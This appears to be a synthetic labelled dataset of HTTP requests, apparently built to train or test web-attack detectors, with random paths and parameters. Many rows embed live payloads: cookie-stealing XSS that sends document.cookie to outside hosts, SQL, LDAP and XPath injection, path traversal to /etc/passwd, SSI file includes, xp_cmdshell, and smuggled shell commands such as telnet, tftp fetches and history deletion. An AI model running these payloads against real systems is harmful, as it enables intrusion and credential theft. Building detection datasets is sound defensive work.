GET,/0ZB2AyMYr7m0tjE/e16qk0KctlUG/vc.png,HTTP/1.1,234.16.52.225:2,1,yrttipaOynhoren=r.-&yetslwiede46d=%29++++%28+%7C++++%28displayName%3Dhad*%29++%28name+++%3D+++had*+++%29%28+++mail%3Dhad*++++%29&izeilt9Nxgiw=sftwtaunionmH&et=cipaFoii4ruf41nnrt
GET,/aiXlYfjbW/bOYvbscript8mAf/Y_IPq.tiff,HTTP/1.1,www.aseeebbibt.gov:6113,1,q55bBR2sYj=1&eerreanosnoc=qciaaed&e0=eaauut9nggn&qnieearhtxr=%3C%3Cscript%3E%5Balert++++%28%27raahcmjN6t%27%29%3B%5D%3C%2Fscript+++%3E&ts=44835&sm2hDsef=o4k%3F&Llorceni=5oe
GET,/iBS7/oyqexx2i/tsPmtoe.htm,HTTP/1.0,202.133.168.14:02,1,7htaccesFASHywlB=0-X&ayttnlDLgzhx=bFnien&3IANzuCmqhtaccesEo=passwdn%28dT7u4n&coernycpun=%3Cdiv+onmouseover+++%3D++++%22+++++%5Bwindow.open%28%27http%3A%2F%2F15.61.68.213%2Finel.mdb%27%2Bdocument.cookie%29%3B%5D+%22+%3E&stt0os=ewt5so+tzc4N&tgeDRsaAegptF=ld2yhpndhgoantnwR&3Cpjhtlew3=isoqtgeieleh&blnyxoziSzotr0=Q1vdpsrne&leo5Myh2=54477&7oT=ieeru9y+bd63ep&eetponb=hobjectAnnl%29a&nbo2ste=h_4GbW2&gTe=+tpasswdhn1tg44hs+ai%2Ban%2F%2B&eis=t4roEneaoo45eSd8&hj0d.=816739254
POST,/lyT707Ep5U2xtvu680I/qs7aAfVfGtLQXOc/dody/p83ee/t_Qv7/njjco9O578nG@pjv/stylehPQ0vtk.tiff,HTTP/1.0,168.117.197.28:61,1,nKy7binI1vOF5Y=eee5i&ntudsseughhn=az]i]accepta&jconnect-Z=lzigecsm&qRuvchaPrjms=0mhU5p_W&nep=t&eitan1djbMiu=Lhuds
GET,/fQXR3.8ug3nZ/eHRzK@KT_kgCmt/oFcHUhF4EZraLbO8bJT/dEft-D/dot/dhk/eBT.g.dll,HTTP/1.0,25.166.221.165,0,nlo=226&mh=60606958&eM8jpLlems=106&ocoae=6mmFeK&G1aNgBg2=7795393515&scriptpUolZ=rhkeEmlE2o6nsBeu&iantaaapm=hhavingtn&ifhtltate=nvzi
GET,/7amU4ygZxfW0iie0yy9/tmYFZsUP45AvANi/aenee8neet3zda/b7thGzqP/f9tiR/iHSwJoscflrAhT/0cDEWzUMO/ser4w/m1.wlogD/oarfBou.exe,HTTP/1.1,140.202.201.212,1,islei=880845403&abrbbYcnadofl=%22%29%28targetfilter%3D%28o%3DNetscapeRoot%29%29&Ln4=hfeSesiBnta&edin8dead4ast=s%29efeCaphpe&n8dr8mt7=8240030223&Ieetit=ui38&9othmovct=1
GET,/io3tteesnfardatlwzue/lyidepm/o7cxCOpt/peJ75eahnacose7mas.jpeg,HTTP/1.0,www.esFNm.com,0,erttn5eylrpl=sT&RMPMwZ6=dn&obu47bSiieemF=mohk&ee=0-Zddm&aMeiiun65Swzr=fni0
GET,/hWka4tB3YOmEGUQ/69andZHUaHj/o9rYwS/goaEnz/egca.asp,HTTP/1.1,www.derXaencd.gov,0,ttt9ectd=rosrmgsrehnnokz&re=eh+svdaorperw&jtwtDe9aeagne=2&samdsElsieywe=tdeMhtfo&nzE=miueuabesot9ibyre&see=8doEmd%24Rmho&yIdme=lanf&07ariy6luth=ji
GET,/t1XwuXpt9qTx_Kx/laed/PzFrGy9.CzI/iGFT6eSvjOHaW/we/cdg0d/fapbee67hj/wHgqQ2sIns3F-lYuCv/hLbYjbVM8/m6Ck1zMl.gif,HTTP/1.0,www.it1lh.net,1,ehe=331728&rtT=2567017428&ee2eosee2ac52oj=daosrnOiN&tlur=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&OQbQxtermn=1wftcmjps&BnullNlE=zoaccess_logsv&I3FoydR=document%3Epn&CHPuX-JRh=a0e&dhyer=7%29oo%3Aas%5Cim+e&hes=02
GET,/pW3VYnbVHgqi0c-xC/3XinserthX1/iF7xnhNTUJt/nmc9slabex5es/Ew8meta19RadminxQ/rtehv6e/nctfaasypavt1mer/m0on/ass/o9eews/nula82s/o.Iw4asT79pWQD.jpeg,HTTP/1.1,www.roua.st:179,0,8mRSbaqrhrdgys=sj2q&1d7ts1nulutnna=Hivbscript8ateeh&qnsgod94cey3saE=oEwenWaNssaschMek&9MJdXPh7O=8494797&ES7JEoptwKC5q3=ebeusei3&f2KAPejXt=Iiaxt&iEt3es8pd9uoU=592505475&Aat1hTteHrc=Mlotiatae&eiurrss8ireecp=aips%5D&eewh3t=dopxml%5D+sfj5%25
GET,/sIGyPfUdD90D/Y6Cincludepecho/t0gXohcahq3oul4h/tc/sotlwi.png,HTTP/1.1,www.Rdxgue.fr,0,2oteo2amwmrid=deuRltaneneOwoopes&eRconnectwLlmRLL0c=2852&Eg9t4n1nne1z=641&nwt=eXYD9R&nku5mhcs=a&ncdodemeq3ht4v=ahoo&btslumn=07513808&a8ey6aubel=j
GET,/cqq/goersesirHNoali2/cq/jos2rbm/tdZQW8yI_h.1/aaej4stqas/bm2oIs4nathtprdp/P@Ezb..js,HTTP/1.0,www.b1amic0.cz,1,rep=EheFhctebtoI&Xa0iUDPzVLmochaM=utclspd9voA%24hnrtP&7bsv=5EPidtOihttpin%3E0a6+%28+I%3Fy&riistnghnk=rieSn&ietnir=oxxAAdv3GQg&jibihH=llti&c09=a1VyJ49xbp7G&qao2clergseoec=vtdro%28sesq+tnsiitt&7XMchildadmin=%3C%21--%23include+++virtual%3D%22%2Fetc%2Fpasswd%22+++--%3E
GET,/pam0q7GraRx0IDn/srheeogd.mdb,HTTP/1.0,222.251.170.145,1,sihrdd=tr8lr7Dkt6tadhl&Elsosmatsrio=bunionsnSai3e&67el=6792906&aEqvasi=0&emttauMFsL=wlttsf&hs9s=484747&Q7Fbody=cl%29%28++%7C+++%28eln%3D*%29&iali=A+&iEywto5ewdr=906162&ci7erAt7eowina=uqonaekm&deleteWAg5=b3aetter
GET,/zSti.htm,HTTP/1.0,www.hre4oiRc7h.biz,1,u6Tgrg=eNv1%3Alrttdocumenth%5B%3Cw&88=oaiton+&lsete2e=%3C%21--%23echo+var%3D%22date_gmt%22--%3E
GET,/ziemnn9esorTltZc/kSlw5niakiOrsac/ib8lm78Niit.tiff,HTTP/1.0,www.tr0r.net,0,nfwaEfdZq6ilo=7894652726&rWithb4asTlh=ae%25eHsiht&eustkEnleRefs2=uianxmndcoesmne&Dp=aTFw&c8likeP@=slilad9ppiiedeHD7&iRnriamHszD=Aor&ho=onwmaeyntOrmtoi&ptlenc=l%40CuRdoRU&sp5yK_xdh7F4=0%40+%3Bge1processing-instructionusreeeUiL&teehdieca3=lcate8a&Vzj9Y_O7i=nU2hCF3.&sz6gpneie3=rtntrxmltaytipst
GET,/EuNhV-@0m/Pinclude04m/o4eibhou1/eZZFZn/trYO1ArFXYD/shiNao/hSVBKLiTX9C7P/md.msf,HTTP/1.0,5.139.52.55,1,talaua8tt8=ieuTlWF%3Eopen&2YZboot.iniYpositionyP-1S8=%3Cobject+++classid+%3D+%22+++++clsid%3A...+++++%22++++codebase+%3D+++%22javascript%3A+%5Bdocument.location.replace+%28%27http%3A%2F%2Fwww.la.com%2Fcgi-bin%2Ftotoetmall.cgi%27%2Bdocument.cookie%29%3B%5D+++++%22%3E
GET,/lgWR9HJ9/o3sbzea0EdgbtidxeseS/triezutawe/z4.html,HTTP/1.0,214.13.35.49,1,naouttdmer=3AmEzln6Eht&osamYE=0rdi6p1veipdiaastY&Et43qOnor5ea=%27+++++OR+++++%27erp4nderoiNne%27%3D++++%27++++&8oswz=r2yceseagm&EoedhsNso=n6ap2dlu%3B%5BwAea&positionwMCbrqtEHUG=9130&YselectCefj=yA&rsa8rle8l=taiHrnorenopthlAi&eeej=leetnYBhoiagastaf
GET,/etbtatyIjp35u4uis/sO2fzvlB5qwXZd/SCB5oJ.htm,HTTP/1.0,60.20.170.25:80,0,IBzroby=rirzrh1bi&l90e7mciA=yyiF%40a%3Dsle4tret%7C4c&9ncmz2hei=87868&deaeeit=FS%3Fbo&eaeaec=5
GET,/LVagroup byxIX/luetTe6Hmda/yacsrnnu/iRyUDJ-KCLHWsRY/ldireoriqkser/raroRg9zra/xeboy2hmvO4otsiSea/n5muOPFw6ONr/whnX8AdX/rXe@Hgf74Z5mB_1YRtO/rnmAJiLbrn.MIPV/kehaD_ihuYhFU.UWQ7x.shtml,HTTP/1.1,www.aerhKehsrq.it,0,eautoexec0ncHg.ijn_H=osreUsi1bv6rrr4R&6BK_pRdOIs=q%7E&3heext=iSidi7fn&rc=3i+%25udbTy&cmnmsfisSsfn=oetfnlnesI&ESJvpmaccept=770291&jg6Lsx=o+rzej&qCupdateu7=ego+Chxsnrs%27&atcl8ihaet=34649699
GET,/vWueVz36J-jQ/mTC.AeuimggJ8homel_/ntps/rh/ree6Det7eo2roewqhj/ufVnriqsBof6Ts/rhR-G@Nh_eE3Mx5P/oERQH-8A5.js,HTTP/1.1,www.6acTyao.de:80,0,dHurefePIosp0e=ttdM%24L%24r%5D%24rii%3Faczate&diotenEnkte=9
PUT,/tiewdwB9ivVFk9/adPBFw_/dsTv0Qw/obInHld8HBf/Ropsz/biAEssuoeoyTaBiTzeN/tanaeptncluur0oY6msg/zhyEith/Ia0fnNueoEt4uoorv/GbJ/lqugesnesnia8.js,HTTP/1.0,59.2.49.105,1,fSesaialdceh=<![CDATA[<!--]]  ><script  >[alert  ('beoebIu');]//--></script    >
POST,/u2/ihidta/nV@tnS/duagu0PFVE/ciPgevHvLZX/hntrittsteeug/lE8gpRmG5QEy/rv/VXoqCXOzid2bin/in.pl,HTTP/1.0,www.witl.uk,0,c4=1061333&esEAeieee=tYd&ecugd9=bDYya&aehSuN=nbs0Ahl9asargketal&fhletencn=hiiw4aAlNb$aka&Ht0taxosv=?;s7knbre oiShaving&noeeodiwck='h&eseic3racco=sglEdotldltdRoOmT4&adoas3=880370&doCnn8ibreA=774&mdiiaietxutea=cnd&tlaaarbfrfOodaw=153006156&mintq4k3sdasHh8=089
GET,/uk0rdn/aj9olH_8Of_QW/rhtea/wwgaGn/hcagokt50tLikfnr/Extermtboot.inilGusLnlibZR/i.vU843JokoZvqo.ll.mdb,HTTP/1.0,www.0rzwmeaae.net:521,0,dteffarsdsatotl=haaet%7Cs%25tnlinkiab&jat3qt3bu=611849&aeeS9yetA=92038226&oHstdincQ=eD3Gm&n4mh1iniml=rLNWrjjlI.pj&ietox8=plohecrpiorrsg&duypdsGt5tnutwy=whwN2h
POST,/kx/5y7SqjRgpIXraW4sZ_/ttdziane7jrXs/ajer7aOIawrilS3tiede/maotjoy9ynih/ihsmxeparlb/lWPhWVn2uL5@L2TuRob/t_dGTZ4XA/oottoehmcloLee/scljOMow_NRNGPW/4hGsf_/Ite.nsf,HTTP/1.0,www.fonuR.de,1,iiscyins=) ( | (cn=*o   'brien*    )(mail=*o 'brien*   ) 
GET,/4naswne/Ikodsf1ptdmpeQve/iXa6Lul-3dTKjBzCnaK/np4hfgTs/cy8ec7tluZr.sh,HTTP/1.0,www.eSohfolt.gov,1,d4mRlwyCn=%3C%21--+++%23include+++virtual%3D%22c%3A%5Cwinnt%5Csystem.ini%22--%3E&y0LmochaPz=evbNaC%405&aInznktn1ON8i=axEz.i0MT2b1&X13oaamw=9nyirshyse&6e3me4erantwyh=esMhhZHn9ooeH&iwTt2tdoqacdq=l+a%25i
POST,/do/RaeuweEb3tadriuttTuo/8P_BFjmdg45ZV2A/nq/ls8esoqscaht/wjYGQk8dQ.nsf,HTTP/1.0,www.2nece.gov:80,1,ytcdkhetccetNy=207064&sy=eU&YKdv=r%u4&E7irR9S=tstzatAia9elf&coeeamgeealtah=]daemo?gl-&as= oL/r:mdaoeI&HV7E5m=~ :yrozed7etsus&2OlQJE='    ;    rm    ~/.bash_history     ;
GET,/0Mp4/Awc5Ils/b8fFi@G8mPlj1ucYNs/gA/nuu0JbZ0/LnuQ.aspx,HTTP/1.1,59.171.41.1:10,0,ihBVSV=n0eeosNnfiearonst&auie=45310&dOstp=emq_AwNZJ7D&ucauocc8=passthru&us=rDu&ttrhofoRkhM=Tt0cbodyjbtihi2x9&5reuwthisiezts=3hoNaQTgzD&el8sndiuh4f0mA=%7E%24&M@IL.PG=74&Ttentioeee=Yelo91i5oiA7ifeosg&pedLcqaW=4
GET,/cXN5gsy86bS/rtjraozttshhl/dAY/azSZ@ykgBzI/WSobjectMz61IEQ.shtml,HTTP/1.0,www.ymoc.cz,1,ONd3yedm=eox&gPYU=Puj&actEnY=Zinr&ZtD=uI1Ua5eagt7elTc&nAsjmVWh=e&8tphh=28&twdIxx=89&reDur3nLEt7net=exec++xp_regwrite++%27HKEY_LOCAL_MACHINE%27%2C%27SOFTWARE%5CMicrosoft%5CMSSQLServer%5CClient%5CConnectTo%27%2C%27d9aeqn%27%2C%27REG_SZ%27%2C%27DBMSSOCN%2Chackersip%2C80%27
GET,/ogoipetoou7fhsbnl/kwaccess_logF4L.pl,HTTP/1.1,www.5yete.fr:4,0,c3af3eies0yo=oboot.iniib&0LffVea=valnitaEbt&SFM14YSxp_R4=bodyrgu9&1alhi=eDibgsound%24Amtounionb&wlGo5ry=depluehmbsandce
POST,/irrbeUgSe4Spinhrawv8/oream49gioRsosb/stdiniformObfservicesz/9xFinputvHTGX.pl,HTTP/1.0,207.72.220.152,1,aav=hor)(&(objectClass  = lT*)&eiloeaapst64llg=rY@6LOgtyZ
GET,/hla9J4F-4QF0hrE/hwCncIWo@RI/cteroanha/n1xgna.f3HS1Zd9j.jf.jsp,HTTP/1.0,www.hnp4bbebh.it,0,4RW.8tr4l2=749955
GET,/8qI@kHczYPEiDq4SK/nMtP8kHRFsJnC/aU1f@@C6Xqyam/0G_xtermXbNp_UJ/ld0rpGnGl09MNAB4KZ/xaFzHL9C-CfqA/tyedk/9p.5QNEn/t5a.3hTVv-1dGjw1N/oeaatSsdiuocw/w7rW5rI1R4E4jCy/7e.js,HTTP/1.1,221.22.78.223,0,zEGWqOb8B07=iVt8EbB%40jgcB&EHDvKB=lFUN1ks&lvC5psnJTaG-q=4678&dBfoietli=ans&KUconnectperltj.Ck=%7CNi&ssn=3piarviegals&oaito=bunigroup+byefNettoif&etdq=510818&tmamH4aoe=1752672869&icteye=vdrop%40ecmdr%29stgl%3AnetcatcnetcatL&S8varML-txw@@=ulmall
GET,/..%5c../..%5c../..%5c/../../../winnt/system32/cmd.exe,HTTP/1.0,www.r9fxreGdi.de,1,/c+dir
GET,/anu/ilanliooti9jdduoujE/w3nu0orsssool3s/gIformdBpassthrusK6KxF/hat/tRdd0ciOe29azotl9r3/g4hlib02wF4.qhavingEcY/4b2/d3OZ.l/Ekedvamvo/R6gU9./in.asp,HTTP/1.1,www.p6rggtnntw.gov:74,1,8Afonshiet52wde=having%28n&sso7enndn=lnN&wVg03Xq3C@=tits&enle6ii=l-&5nno2s0ift0i=oxox&eatviufy7iOohI=%5Cnls+++%2Froot%2F&jrstHbeILi=ni&CG.Gwp-=do+l&I5hEbnftbsmt=e7dho
PUT,/1Qjvarhwe@D6Tx/kL_KZOk.r7RJUY_spiH/uTreiazssequmauoi.asmx,HTTP/1.0,72.86.5.176:80,0,dwzaalAseui=h.u&usdttpp=ie:xnbsns7p&arrfsq47ocibta=<to&aktsjhz2uaIi4=hr)xnetcat&iy7tannecew=938&akf=eb\\eo&6i=6&aTaV7i=ij'aed4enoakte
GET,/g9h2.knC3tvyt/jR29rI.YywMqSA3/h1/ceqgtm/.C0_ImKDhtaccesK/lKbs/een.jsp,HTTP/1.1,www.Ueykusz.fr:55252,1,Iex=20302925&sknAi62euNr9Lf=kouyVqfrolM8s6n&ltbNwana=y%40%7Ck5%403s&PMdBr6rservicesA=02621&rtrogsjsmislee=658&86=zeqj28&oui2tiIsaseemu=bsm0&0etsoe0ztanpee=nfa&tn=sOjbGFmz&lnlr=%27+AND++++USER_NAME%28%29%3D%27rf&cul=b%40ketNp
GET,/ml_Wrulo0ZmW--S1MTOl/dyxd/mepnpafA9t/rM4y/odm.css,HTTP/1.1,39.134.37.204:80,1,nioenteomn2dysy=rges98&tykbeepecas=ncmYedlrpdtnse&vhollfxOrSTi=710452&rntg=..%2F..%2FUBData%2FMembers%2Fmembers.grp%2500&gwtmaeCt=d0EtPFdrm&t7l3elif8lt=aXt6e7&goeefet=tktmooOIhaMo&8inrksxr4=822&tf5pae7ie=ncdqlikedey&sxob=aUHw6d
GET,/eOe8GAtEr/ch_Dno5bns0e..h/mlhotis4lscheii.tiff,HTTP/1.0,94.15.102.32:80,1,cchnt8=%3C%21--++%23include+virtual%3D%22d%3A%5Cwindows%5Cautoexec.bat%22++--%3E
GET,/vlAKW@6/7Xg00eVjr1FTsKC/f56o/4aSuv/tM4TBsD24ZUBn/-m/aaxfq/UgrTEH7D-06E9QU/rDmft9DoPkAKTw2Vf1YN/ln1tMVEeaj.js,HTTP/1.1,www.reSheyeoee.ch,1,oe=7346&7oenrndo2yensmn=Gtsh++style%3Dleft%3Aexpression%28alert++++%28ogtn.1p3%29%29&Thmlh=%3BwEryt0a
GET,/ycanrbale0kbtoileR/orneeFrkyq/LaredsbrgtsK6ew/c5WI0k/rnr0kzrni3ra/8a1esNh/GrreIhenjof.jpg,HTTP/1.0,152.134.114.161:96,1,C-9GLX-aGlinclude=oyA_&lfiuhg=44025057&exmEheEdSogcTie=2nr%27++++or+6++%3C+count%28path%2Fchild%3A%3A*%29+or++++%27nqNxcPe%27+++%3D++%27&Nu3n=srq3+%3Bt&re2n3klodsBetcf=7947225609&sk=dZU9P6b.Cktx&dal65rdco=65940&zrn=esl9roo
GET,/aN9nrwaiq0de.html,HTTP/1.0,www.ssanw.uk:138,1,rTqlcfasMsdi=pawpnke%27++++or++count%28+++path%2Fchild%3A%3Anode%28%29%5Bposition%28++%29%3D%28%28+++i++++%2B++++j+%2B++k%2B++l++++%2B+1%29%5D+++++%7C++++path%2Fchild%3A%3A*%28%29%5Bposition%28%29%3D%28k%2B1%29%5D%29%3D1+++or++%276sSsKh%27++++%3D++%27+++++dhop%27+or&saava=2800&tt6yfta=eeagaor4c&lutaNuhura=39674381&0LQ7yAFv30=eE&xwindow.opencat-betweenebr_4p=20561
GET,/h6updateU@/cZL9fliV8.QL5Xaatja/tfnseprete8anlg/73/ieeeqyenz/fzCrryiKQHC9kNG/ZSNtx29Xe/iiNfm1eYgKn8qB66jY6/ANAADHr/a@z43795sHVBdrtgBQ/R6/DLoteo.tiff,HTTP/1.0,141.39.64.9,0,sdr=6775386&stdin.R2C_OP=yda9f&reigxFTneM=arWs24W7o&E_CQMR=documentuxopt30%3CtoiU&uon2nptdsuo=437563&jpysa=cX7VOu_PW&PH-FDEaccess_logc=stmpbtened+wp-havinga&otels06gtRna=o%3A%5C&s7umnis6et=2728&txeeaQm0mur=a-_qPk&etcaag93=nodetqolNoerincludeas&IxhE4=dci&passwd0dKYperlbetween_Kd=1&rraeely=s5h9it2l&LeF8Zx5uW=%2Fn%2Fmb3atnt
GET,/osnnreHvj4e2fmDc/nF/bFxussT-qS/s4QN/FoptlFboLKnW5/I4QX-hOopenOGZ/ccawenidmdnih/hQQ0nG@hQ2/eosqbvt0lrlsenen/twwyg7n4zf9_TaOPw/hruenyb/natorcT.htm,HTTP/1.0,www.elFcvh1s.biz:80,1,zvssLalc=560&bnifgEls7=731147005&hee3oeNo2Snitat=92&YqjusroH=ecin7oic3Ul&gmetbFTi2absgae=9264&Aey4iddsnOielo=tmph%28e%22Ajnnfxi%5Cs+0&JF_.RCg8RM=%29+++%28%7C++++%28nrs%3Diom*%29&IBqQbG2h4=hsietnesme23Rx6EH&e0uitesuist=rrrrr6hyya&dcc=th%7Ceyiand%3D&Ikt=7&jaia=5eolyo&e9thzclai2h=898224
GET,/uqtod/d_4/f-L0d6dR/BscriptHEqnFwTetc/r1hO5pb9a-04vfJ./bDrhw.wk1Hj1twd.html,HTTP/1.0,214.16.119.171:80,1,KiA2=%5C%22+++++%5C%3B%5C%2Fusr%5C%2Fbin%5C%2Ftelnet+www.etiegeraol.com+++++01168+++++%3B&Oobbo=eysheroc0t&ay75rh=4562290&anehatanoooSttt=33375534
GET,/ftp8WRBjsW9nhib/n9L3/sqP802Gq4/loGq8AZx/rf0BfSwjuY/uqI.nsf,HTTP/1.0,www.Eait.cz:80,1,97x=%3Clink++rel++++%3D++%22stylesheet+++++%22+++++href+%3D++++%22++++javascript%3A++%5Bdocument.location.replace++++%28%27http%3A%2F%2Fwww.icissi.com%2Fcgi-bin%2Fdeonas.cgi%27%2Bdocument.cookie%29%3B%5D+++++%22+++%3E&tMkns=365&sprlia4kss=ne8ewnryhlScdth&jG1jfte=13&7zopmnd6hwj=08409&Atieyoo=replaceti&wnIvnsdfnhnY=ssY&steiznLehAai=0468515
GET,/teAEnrtJboEoYbn8eio/h@vc/un3oekrAbaxbf/MrL9/tetoia5ttRnnaawe/q29dHfNq_GservicesDz/e1/x_documentV5B.object2GBJboot.iniC3/zhTYWB2HI7j5-v.jsp,HTTP/1.1,26.25.29.209,0,P%ufGabWFeMuB=1s%25op9a6lr&hooao=4058&-wgetcX=%5BallhA&zn4aei=aDh1
GET,/o6u/eWowN/jaKqHGRdgTscript/kzChF/-shtacceswinntS/uscriptFpasswd1VwD/eokh1tJbv/lctei.png,HTTP/1.0,www.qentifig.uk,0,neleanheeneqeu=anR&Red2gO=ehe-tMonnPnr&hgtoj=151718&4tonEc=sl0zahtJZp3&Io7jks=01652&lu=eatoof7aouje
GET,/UMJXcIAqs83/eaje/eJVD/tfYY.X@@0QOAV/waT/hTeJ/amigfelys.jpg,HTTP/1.0,110.191.221.26,0,nmmb1tt7srro=ce%7Ezdoe4%25o&N8EPpasswdd=h+nh%3CreC%3Fthhse&suw=rnpn&aieattTCCn1=7966690&8mhdetd97wNoau=eliltzthens
GET,/gZ3LSnYsqlEpSf.mdb,HTTP/1.0,www.bnOgaruind.ch,0,sainlRtaoaleir=dtorr&rnnarm=5256968468&ii7h6h5lw=bXa3m.-9T1&czHhth=qvxgbb.OegV&8mofelo=ems1gsfinmAacNiE&1stseahh=63&3aeKtiiasohu=4nym%2F&hiphNuaz28nl=no%2Bee%7C%7Eytmpltrv%5B&tewat=aaathotocfkl4
GET,/FiWNpasswdlocationh-o/6IWd.YU/nt6cs/t7/h5sRZEHgViaWEJ4xfJ6/ectytaAhYa25E3/H7sttragse/4pdeetl/passthruxj/sGU5ZK4I5.sh,HTTP/1.1,www.wf96l.com,1,r0neOe=t-Rkyh&ioreap=bEhdeibSnnYRSn&sibp6cibjgnopN=884&Of1qnodeo=exec++++xp_cmdshell+%27%22qa%22+++++%3E%3E+script.vbs%27&ehnhor4oYd=edpui6me2eWnnN&yghynT=0977&rhwatone=ssnssreuF%5Deleug&naanYhbdotthe=8eltO&36ieumDip=sii%25n&onrs=buyWurrls2b
PUT,/nTxfS-32PhSUJ.aspx,HTTP/1.0,www.D7ynnVp9.st,1,t7=ston3prnloo&sxbn=783412&Eohci5ohxPsEe=6424&7bzrl2eeonYonnl=eiscr c+h&rxNyws6Imw=740&oea=hooqmhx)r&qtRztH0pJ.=<![CDATA[<!--]]><script>[document.location.replace  ('http://www.to.com/cgi-bin/ri.cgi'+document.cookie);]//--></script >&eremh=sqQ6SD&IUrtsol2nlaosh=7&dactnntsTe0czup=e34db5&lmywt=|m&t5nsioRoadIiau=oyve_
GET,/f2doxi5rbrsfhir/gwde@y7ItGUboYGqw/t5sheqnh/raBzx9D7HAtS9p/wPep.W_i4cA/dw5uvqqKXx@x4a/39/oF/a-of_r8TnYWJE/fZY4wSe.jpeg,HTTP/1.1,www.e5os.st,1,eoitfj7eolhyo=%27+++++group+++by++users.id++++having+++9773%3D9773&ewnteneizie76d=0&Gwp-0aEpasswdUoORb=531
GET,/T6PIcC/Npassthrur.Ginput9selecteZcat.Tu/C1tic/uzryloo/idtnnbrslotrSstrlnr/gosvsA/aPGzefbt9a72X@3/eFhx./7SeesbTfueto/pRrhmcniinw7el/V_0BdlogO.png,HTTP/1.0,www.m6t9g.uk,0,DrevHc=4433&slcdniPe=eMda&arfeo=nLIouIVlKlcf&F7jmdrcRnodekG=EtR%3B&UetcIs-gG=3&alet56=cNrN0&etngEdhti=%25EDgq&u0=qm&st6t=lT37Nn&i7tashiipui=erfcbdhz&alehtenfs5rsona=%5CSt2stdnc3iteeo&xeei7cowiebmoe=h&na=ftpaeshnph-e+oteScpasswd&cwOrdncsIaxe=isisarbetweena1+miimgcd&sahessnfaN=92288
GET,/V_sKxP1Geval/emeknisaakyu45b7e/YwheredrU3mY1EvP/Rsqoiid64Gsma/_YacGiframes@28in/e-XHsodzhWQeAc/nwnXVwv84j8j25h9ufJg.swf,HTTP/1.0,66.234.186.196:7343,0,ogei3sp0Esd=07770&unzerSsEwbsROLi=rtDleaem%3B+&6V0jareuov=56885885&ptnELd=7iThtpallwwgg&qOT0hq=07532821&5ria=10&5Q0-4gE@=71&8f=46875&at=%5B8zRe9iyan&sss5Je5eorTl=8200&processing-instructioncath3scriptF3sbgsoundLi5=%7E9%3D&elisia=+-c&knx=processing-instruction%3D8eanHi0a+lstdinwr&dutdnermoh=%29sock_stream%40d+&taeqjac=4
POST,/0z-QS7UrHU8processing-instruction/httpPVU4u/ehd1Nl/nun/n9s-LG2/rFDIbLMtXD49H4ashZ/eht.jpg,HTTP/1.0,250.173.62.122:83978,1,ysdcsr6ikiist=aG565&roCr6= it&t|d?avC7  =&8apea=6i&tssa1hesuocaa=i+&sCP=ijsperlea5asirL&rysnEroamdT=eatq'     UNION    ALL    SELECT    s2isaon FROM   ra     WHERE  ''    =  '&-QQncit7hincludeSsstyle=1ra&uduwatiS=mmmagrehEqafe3eh&shqeherb4cot=N'O&M1RpgCOvarh=9928732432&timjphn=arax&x5QYN9R=049460&Zangodr3hib=53447855
GET,/u._Rsystem0an5/eebmr6meohyPfai/po@@Gd/rdt4osvaeCs5auoled.js,HTTP/1.1,www.ieiEsaos.gov,1,.I9YVQ=821&jhIl2nNrTm=ilt1EhmeabNn&e8n1rrxta0s0sQs=6&Njp1-Knrcp=1534&etei=rrr3tegi4m%3Aa&t74aosrigt=3126801&nsroh=hKi-&2sit5arowgshyq=ts8%3Fservicesqor&wdun=31&armao=e%40wvFahF%40vc&eoso=Si%3D+i%3EsTue%3E1iu&esmstiooi8en=%27++%3B++tftp++++-c+get++++www.aneranngst.com%3A%2Fal.tar&RDsX=85744&gdaubEiD=829213975
GET,/tdceny/sike3tltutne.html,HTTP/1.1,73.55.23.217,1,nnassthioh=%29+%28+%7C+%28displayName%3Dhad*%29++++%28name+++%3D++++had*%29%28++mail%3Dhad*%29
GET,/8t3/rp5zeVxS1tL/gtrraur6evhoRbo7Iw2b/6l4YsystemQe2AyOVkz/izehr/4VtyU.Tzh/tdedqNeozaoidea/3R/fent/jHmsq/2kRFS9MFlbWmr-ak..sh,HTTP/1.0,170.175.22.206,0,d5ap0utnh=wusicrLefshab&ssc5dOs=o-PQAHNVPG3-&hn5te2ztp=278056&pad0mcixtd2tfn=4756518589&urlaTiE=dy&eyUkuersblinb=atc4we&w1nxieccwqyfaf=efoum3a&eTenIsnoegrTtnh=5570&saiiazT=+histoo0r%7Eteo&aosfek=7e&z0T9ftoa2yo=5%5C%5CiifoFn&tooeO=3250013&tinvjo25nnpst=95V.&eitn=iof&esdoa=hhavingwhere
GET,/_xHrSdhEVoHie/ardTosweOthhegxt/uT/x.kHnwcftkP1QY2Es7ss/rT/hCp5w/eddriaMymua4wdhabt/edmtoar/mekAetlf/lEhni.tiff,HTTP/1.1,www.hnFtuigd.st:1,1,EinlinkVoimgM0openSI=157796&togSIaaia=3gnLPUsL&depr0tvi=%3Cform%2Bname%3Dtbe++++%3E%3Cselect%2Bname%3Dundc+++%3Ehttp%3A%2F%2Fwww.W.com%2FAuOn2n%2F%3F%3C%2Fselect++%3E%3C%2Fform++++%3E&3z=c%40ony%3AHWenq
GET,/OAHa_Y/uatci/3dsvtra/iutxtBRneettpIqa/JOjRmRN/47j-UR/syTuCHMQ_ZOqwq/saaotoewaoesmf95cnq/e_VS@8M2CSNAR-P/aHUH/8eaCe5erUnrerfSoNb/hP.php,HTTP/1.0,69.190.169.176,0,eL3JrcpVvOjmochau=5
GET,/4g3StFOWdWyJQQ3x/tnn/QBMTd-3WC/bopassthruv%udM/iehm9k9nadc/ovcepyRIsoS/iltbctA7Saaf8r/MRCc7BV2B/radGfoFraxoYbLaEde/razknoDa/mopltw4I.jpeg,HTTP/1.0,95.203.54.19,1,oImtaont5iqeO=719&akUiwhecao=+Ut&rirC9aslslnT=50974&srarttoaankmw=3&P-0qw=e%27ee&0sitfg=84719+++++or++count%28path%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D%28%28i%2Bj%2Bk%2Bl%2B1%29%5D+%7C++++path%2Fchild%3A%3A*%28%29%5Bposition%28%29%3D%28k%2B1%29%5D%29%3D1++++or++1721%3D&bodyzIfKkhttpg=eqtfd+oe%26owdS%26vartwp-&XKsystemrNH7a@=t%3Cs&jyT=861073047&rtdgiGitttaSeCn=5749&pn0oyHdQ=80079&jZFXPJetc88g=wLsFsj1XS&etrbiatlt5ay=wot1&sio=c
